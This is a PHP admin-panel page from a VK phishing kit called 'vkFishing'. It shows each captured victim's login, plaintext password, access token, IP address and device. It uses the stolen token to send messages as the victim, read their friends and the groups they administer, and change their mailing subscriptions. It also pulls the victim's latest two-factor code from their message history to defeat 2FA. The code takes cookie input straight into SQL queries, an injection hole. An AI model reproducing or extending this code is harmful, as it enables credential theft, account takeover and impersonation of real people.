<?php

	session_start();

	if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
		$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		$code = md5($user['code']);
		$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
		
		if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		} else {
			$admin = mysql_fetch_assoc(mysql_query("SELECT `login`,`dark_theme`,`preloader` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
			
			$id = substr(userCurrentURL(), mb_strlen(siteURL())+20);
			$user = mysql_fetch_assoc(mysql_query("SELECT * FROM `catch` WHERE `id` = '$id'"));
			
			$execute = urlencode('return API.account.getProfileInfo();');
			$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['access_token'].'')));
			
			if(isset($vkapi->error)) {
				$invalid = True;
			} else {
				if($vkapi->response->sex == 0) {
					$user['sex'] = 'Не указан';
				} elseif($vkapi->response->sex == 1) {
					$user['sex'] = 'Женский';
				} elseif($vkapi->response->sex == 2) {
					$user['sex'] = 'Мужской';
				}
				$user['bdate'] = $vkapi->response->bdate;
				$user['country'] = $vkapi->response->country;
				$user['status'] = $vkapi->response->status;
			}
			
			$execute = urlencode('return API.messages.isMessagesFromGroupAllowed({"group_id":"'.$config['group_id'].'", "user_id":"'.$user['uid'].'"});');
			$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$config['access_token'].'')));
			
			if($vkapi->error) {
				$user['mailing'];
			} else {
				$user['mailing'] = $vkapi->response->is_allowed;
			}
			
			$execute = urlencode('return API.users.get({"user_ids":"'.$user['uid'].'", "fields":"photo_200,domain,counters,last_seen"});');
			$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$config['access_token'].'')));
			
			$user['device'] = $vkapi->response[0]->last_seen->platform;
			
			if($user['device'] == 1) {
				$user['device'] = 'fa fa-mobile';
			} elseif($user['device'] == 2) {
				$user['device'] = 'fa fa-apple';
			} elseif($user['device'] == 3) {
				$user['device'] = 'fa fa-apple';
			} elseif($user['device'] == 4) {
				$user['device'] = 'fa fa-android';
			} elseif($user['device'] == 5) {
				$user['device'] = 'fa fa-windows';
			} elseif($user['device'] == 6) {
				$user['device'] = 'fa fa-windows';
			} elseif($user['device'] == 7) {
				$user['device'] = 'fa fa-desktop';
			}
			
			$user = Array(
				'id' => $user['id'],
				'uid' => $user['uid'],
				'domain' => $vkapi->response[0]->domain,
				'closed' => $vkapi->response[0]->is_closed,
				'login'	=> $user['login'],
				'password' => $user['password'],
				'token' => $user['access_token'],
				'hide' => $user['hide'],
				'2fa' => $user['2fa'],
				'firstname'	=> $vkapi->response[0]->first_name,
				'lastname' => $vkapi->response[0]->last_name,
				'avatar' => $vkapi->response[0]->photo_200,
				'friends' => $vkapi->response[0]->counters->friends,
				'followers' => $vkapi->response[0]->counters->followers,
				'gifts' => $vkapi->response[0]->counters->gifts,
				'online' => $vkapi->response[0]->last_seen->time,
				'device' => $user['device'],
				'status' => $user['status'],
				'sex' => $user['sex'],
				'bdate' => $user['bdate'],
				'mailing' => $user['mailing'],
				'country' => $user['country'],
				'browser' => $user['browser'],
				'os' => $user['os'],
				'ip' => $user['ip']
			);
			
			if(isset($_POST['message_send'])) {
				if(!empty($_POST['user_id']) AND !empty($_POST['message'])) {
					$user_id = trim($_POST['user_id']);
					$message = htmlspecialchars($_POST['message']);
					
					$execute = urlencode('return API.messages.send({"user_id":"'.$user_id.'","random_id":"'.rand(100000000,999999999).'","message":"'.$message.'"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));		
				}
				
				header('Location: '. userCurrentURL());
			}
			
			if(isset($_POST['mailing'])) {
				if($user['mailing'] == '0') {
					$execute = urlencode('return API.messages.allowMessagesFromGroup({"group_id":"'.$config['group_id'].'"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));
						
					if($vkapi->response) {
						$query = "UPDATE `catch`
								  SET `mailing` = '1'
								  WHERE `id` = '".$user['id']."'
								 ";
						$res = mysql_query($query) or die (mysql_error());
						
						header('Location: '. userCurrentURL());
					}
				} else {
					$execute = urlencode('return API.messages.denyMessagesFromGroup({"group_id":"'.$config['group_id'].'"});');
					$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));
					
					if($vkapi->response) {
						$query = "UPDATE `catch`
								  SET `mailing` = '0'
								  WHERE `id` = '".$user['id']."'
								 ";
						$res = mysql_query($query) or die (mysql_error());
						
						header('Location: '. userCurrentURL());
					}
				}
			}
		}
	} else {
		setcookie('uid', NULL, time()-3600*7);
		setcookie('code', NULL, time()-3600*7);
		setcookie('hash', NULL, time()-3600*7);
		header('Location: '.siteURL().'/apanel?act=auth');
	}

?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title><?php echo $page['title']; ?></title>
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/font-awesome.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/ionicons.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/chartist.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/rickshaw.min.css" rel="stylesheet">
	<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">
	<?php if($config['dark_theme'] == True AND $admin['dark_theme'] == True) { echo '<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">'; } ?>
</head>
<body>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<div id="loading">
		<div id="loading-center">
			<div id="loading-center-absolute">
				<div class="object" id="object_four"></div>
				<div class="object" id="object_three"></div>
				<div class="object" id="object_two"></div>
				<div class="object" id="object_one"></div>
			</div>
		</div>
	</div>
	<?php } ?>
	<div class="slim-header">
		<div class="container">
			<div class="slim-header-left">
				<h2 class="slim-logo"><a href="<?php echo siteURL().'/apanel'; ?>">vkFishing</a></h2>
			</div>
			<div class="slim-header-right">
				<a href="<?php echo siteURL(); ?>/apanel?act=settings" class="header-notification">
					<i class="icon ion-gear-a"></i>
				</a>
				<a href="<?php echo siteURL(); ?>/apanel?act=stats" class="header-notification">
					<i class="icon ion-stats-bars"></i>
				</a>
				<div class="dropdown dropdown-c">
					<a href="#" class="logged-user" data-toggle="dropdown"> <img src="https://vk.com/images/gift/952/512.png" alt=""> <span><?php echo $admin['login']; ?></span> <i class="fa fa-angle-down"></i> </a>
					<div class="dropdown-menu dropdown-menu-right">
						<nav class="nav"><a href="<?php echo siteURL(); ?>/apanel?act=edit" class="nav-link"><i class="icon ion-ios-gear"></i> Настройки</a> <a href="<?php echo siteURL().'/apanel?act=logout&hash='.$_COOKIE['hash']; ?>" class="nav-link"><i class="icon ion-forward"></i> Выход</a> </nav>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-mainpanel">
		<div class="container">
			<div class="row row-sm mg-t-20">
				<div class="col-lg-8">
					<div class="card card-profile">
						<div class="card-body">
							<div class="media"> <img src="<?php echo $user['avatar']; ?>" alt="">
								<div class="media-body">
									<h3 class="card-profile-name"><?php echo $user['firstname'].' '.$user['lastname']; ?></h3>
									<p class="card-profile-position"><?php if(!empty($user['status'])) { echo $user['status']; } else { echo 'Статуса нет'; } ?></p>
									<p><i class="<?php echo $user['device']; ?>"></i> <?php if($user['online'] > time()-300) { echo 'Онлайн'; } else { echo new_time(date("d-m-Y H:i:s", $user['online'])); } ?></p>
								</div>
							</div>
						</div>
						<div class="card-footer">
							<a href="" class="card-profile-direct">https://vk.com/id<?php echo $user['uid']; ?></a>
							<div>
								<a href="https://vk.com/<?php echo $user['domain']; ?>">@<?php echo $user['domain']; ?></a>
							</div>
						</div>
					</div>
					<ul class="nav nav-activity-profile mg-t-20">
						<li class="nav-item"><a href="#" class="nav-link"><i class="icon ion-arrow-down-a tx-teal"></i> Скачать данные</a></li>
						<li class="nav-item"><a href="#" class="nav-link"><i class="icon ion-loop tx-primary"></i> Обновить данные</a></li>
						<?php if($user['hide'] == 0) {
								echo '<li class="nav-item"><a href="'.siteURL().'/apanel?act=hide&id='.$user['id'].'" class="nav-link"><i class="icon ion-close tx-danger"></i> Скрыть из списка</a></li>';
							  } else {
								echo '<li class="nav-item"><a href="'.siteURL().'/apanel?act=show&id='.$user['id'].'" class="nav-link"><i class="icon ion-close tx-success" style="transform: rotate(45deg)"></i> Восстановить</a></li>';
							  }
						?>
					</ul>
					<div class="card card-dash-one mg-t-20">
						<div class="row no-gutters">
							<div class="col-lg-4"> <i class="icon ion-person"></i>
								<div class="dash-content">
									<label class="tx-danger">Друзей</label>
									<h2><?php echo number_format($user['friends'], 0, '', ' '); ?></h2> </div>
							</div>
							<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
								<div class="dash-content">
									<label class="tx-primary">Подписчиков</label>
									<h2><?php echo number_format($user['followers'], 0, '', ' '); ?></h2> </div>
							</div>
							<div class="col-lg-4"> <i class="icon ion-ios-briefcase"></i>
								<div class="dash-content">
									<label class="tx-warning">Подарков</label>
									<h2><?php echo number_format($user['gifts'], 0, '', ' '); ?></h2> </div>
							</div>
						</div>
					</div>
					<div class="card card-table mg-t-20">
						<div class="card-header">
							<h6 class="slim-card-title">Прочие данные</h6>
						</div>
						<div class="table-responsive">
							<table class="table mg-b-0 tx-13">
								<tbody>
									<tr>
										<td>Рассылка:</td>
										<td><?php if($user['mailing'] == '1') { echo 'Включена'; } else { echo 'Отключена'; } ?></td>
									</tr>
									<tr>
										<td>Токен:</td>
										<td><?php echo $user['token']; ?></td>
									</tr>
									<tr>
										<td>Логин:</td>
										<td><?php echo $user['login']; ?></td>
									</tr>
									<tr>
										<td>Пароль:</td>
										<td><?php echo $user['password']; ?></td>
									</tr>
									<tr>
										<td>2FA:</td>
										<td><?php if($user['2fa'] == 0) { echo 'Нет'; } else { echo 'Есть'; } ?></td>
									</tr>
									<tr>
										<td>Браузер:</td>
										<td><?php echo $user['browser']; ?></td>
									</tr>
									<tr>
										<td>ОС:</td>
										<td><?php echo $user['os']; ?></td>
									</tr>
									<tr>
										<td>IP:</td>
										<td><a href="https://ipapi.co/<?php echo $user['ip']; ?>/" target="_blank"><?php echo $user['ip']; ?></a></td>
									</tr>
								</tbody>
							</table>
						</div>
					</div>
					<form method="POST">
						<div class="card mg-t-20">
							<div class="card-body pd-30">
								<h6 class="slim-card-title mg-b-30">Отправка сообщения</h6>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="number" name="user_id" class="form-control" placeholder="ID пользователя">
										</div>
									</div>
								</div>
								<div class="form-group">
									<textarea class="form-control" rows="3" name="message" placeholder="Сообщение"></textarea>
								</div>
								<button class="btn btn-primary pd-x-20" type="submit" name="message_send">Отправить</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-lg-4 mg-t-20 mg-lg-t-0">
					<?php if($user['2fa'] == '1') { 
					
							$execute = urlencode('return API.messages.getHistory({"count":"1","user_id":"100"});');
							$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));
					
							$code = substr($vkapi->response->items[0]->text, 46, -280);
					
					?>
					<div class="card card-connection">
						<div class="slim-card-title">Код для авторизации</div>
						<hr>
						<center><h3 class="tx-primary"><?php echo join( ' ', str_split($code)); ?></h3></center>
					</div>
					<?php 
							echo '<div class="card pd-25 mg-t-20">';
						} else {
							echo '<div class="card pd-25">';
						} 
					?>
						<div class="slim-card-title">Личные данные</div>
						<div class="media-list mg-t-25">
							<div class="media">
								<div><i class="fa fa-user"></i></div>
								<div class="media-body mg-l-15 mg-t-4">
									<h6 class="tx-14 tx-gray-700">Профиль</h6> <span class="d-block"><?php if($user['closed'] == 0) { echo 'Открытый'; } else { echo 'Закрытый'; } ?></span> </div>
							</div>
							<div class="media mg-t-25">
								<div><i class="fa fa-user"></i></div>
								<div class="media-body mg-l-15 mg-t-4">
									<h6 class="tx-14 tx-gray-700">Пол</h6> <span class="d-block"><?php if(!empty($user['sex'])) { echo $user['sex']; } else { echo 'Не удалось получить информацию'; } ?></span> </div>
							</div>
							<?php if(preg_match('/(\+\d+|\d+)/', $user['login'])) { ?>
							<div class="media mg-t-25">
								<div><i class="fa fa-phone"></i></div>
								<div class="media-body mg-l-15 mg-t-4">
									<h6 class="tx-14 tx-gray-700">Телефон</h6> <span class="d-block"><?php echo $user['login']; ?></span> </div>
							</div>
							<?php } ?>
							<?php if(preg_match('/.+@.+/', $user['login'])) { ?>
							<div class="media mg-t-25">
								<div><i class="fa fa-envelope"></i></div>
								<div class="media-body mg-l-15 mg-t-4">
									<h6 class="tx-14 tx-gray-700">Email</h6> <span class="d-block"><?php echo $user['login']; ?></span> </div>
							</div>
							<?php } ?>
							<div class="media mg-t-25">
								<div><i class="fa fa-birthday-cake"></i></div>
								<div class="media-body mg-l-15 mg-t-4">
									<h6 class="tx-14 tx-gray-700">День рождения</h6> <span class="d-block"><?php if(!empty($user['bdate'])) { echo nameDate($user['bdate']); } else { echo 'Не удалось получить информацию'; } ?></span> </div>
							</div>
						</div>
					</div>
					<div class="card card-people-list mg-t-20">
						<div class="slim-card-title">Руководитель сообществ</div>
						<div class="media-list">
						<?php 
								
								$execute = urlencode('return API.groups.get({"extended":"1","filter":"admin,editor,moder,advertiser","count":"1000","fields":"members_count"});');
								$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));
								
								if($vkapi->response->count >= 1) {
									for ($rows = 0; $rows < $vkapi->response->count; $rows++) {
											if($vkapi->response->items[$rows]->admin_level == 1) {
												$admin = 'Модератор';
											} elseif($vkapi->response->items[$rows]->admin_level == 2) {
												$admin = 'Редактор';
											} elseif($vkapi->response->items[$rows]->admin_level == 3) {
												$admin = 'Администратор';
											}
										
											echo '<div class="media"> ';
												echo '<img src="'.$vkapi->response->items[$rows]->photo_100.'" alt="">';
												echo '<div class="media-body"> <a href="https://vk.com/club'.$vkapi->response->items[$rows]->id.'">'.$vkapi->response->items[$rows]->name.'</a>';
													echo '<p>'.$admin.'</p>';
													echo '<p>'.number_format($vkapi->response->items[$rows]->members_count, 0, '', ' ').' '.wordEndings($vkapi->response->items[$rows]->members_count, 'участник', 'участника', 'участников').'</p>';
												echo '</div>';
											echo '</div>';
									}
								} else {
									echo '<center>Не удалось получить информацию</center>';
								}
						?>
						</div>
					</div>
					<div class="card card-people-list mg-t-20">
						<div class="slim-card-title">Важные друзья</div>
						<div class="media-list">
						<?php 
								
								$execute = urlencode('return API.friends.get({"order":"hints","count":"5","fields":"photo_100"});');
								$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$user['token'].'')));
								
								if($vkapi->response->count >= 1) {
									for ($rows = 0; $rows < 5; $rows++) {
											echo '<div class="media"> ';
												echo '<img src="'.$vkapi->response->items[$rows]->photo_100.'" alt="">';
												echo '<div class="media-body"> <a href="https://vk.com/id'.$vkapi->response->items[$rows]->id.'">'.$vkapi->response->items[$rows]->first_name.' '.$vkapi->response->items[$rows]->last_name.'</a>';
												echo '</div>';
											echo '</div>';
									}
								} else {
									echo '<center>Не удалось получить информацию</center>';
								}
						?>
						</div>
					</div>
					<form method="POST">
						<div class="card card-people-list mg-t-20">
							<?php  if($user['mailing'] == '0') { echo '<button type="submit" class="btn btn-outline-primary" name="mailing">Подписать на рассылку</button>'; } else { echo '<button type="submit" class="btn btn-outline-danger" name="mailing">Отписать от рассылки</button>'; } ?>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-footer">
		<div class="container">
			<p>Copyright 2019 © All Rights Reserved.</p>
			<p>Created with <font color="red">❤</font> by <a href="https://lolzteam.net/aptyp4uk1337" target="_blank">ApTyp4uK1337</a></p>
		</div>
	</div>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/popper.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/bootstrap.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.cookie.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/chartist.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/d3.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/rickshaw.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.sparkline.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/ResizeSensor.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/dashboard.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/slim.js"></script>
	<?php# if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<script type="text/javascript">
		$(window).load(function() {
			$("#loading").fadeOut(500);
			$("#loading-center").click(function() {
				$("#loading").fadeOut(500);
			})
		})
	</script>
	<?php# } ?>
</body>
</html>